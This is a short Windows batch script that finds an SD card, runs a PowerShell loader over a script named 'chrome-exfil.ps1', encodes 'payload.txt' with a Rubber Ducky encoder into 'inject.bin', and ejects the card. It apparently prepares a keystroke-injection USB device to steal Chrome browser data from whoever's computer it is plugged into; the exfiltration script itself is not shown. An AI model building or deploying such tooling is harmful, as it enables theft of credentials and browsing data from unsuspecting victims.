:: Encode and deploy 
@echo off
SETLOCAL EnableDelayedExpansion

for /f %%d in ('wmic volume get DriveLetter') do (
    if exist %%d\inject.bin (
        set drive=%%d
        goto :encode
    )
)
goto :nosd

:encode
powershell .\simpleloader.ps1 .\chrome-exfil.ps1
java -jar "%~dp0loading\duckencoder.jar" -i "payload.txt" -o %drive%\inject.bin
goto :eject

goto :eof

:eject
timeout /T 2
"%~dp0loading\EjectMedia.exe" %drive%
goto :eof

:nosd
echo No SD card found!
pause

:eof
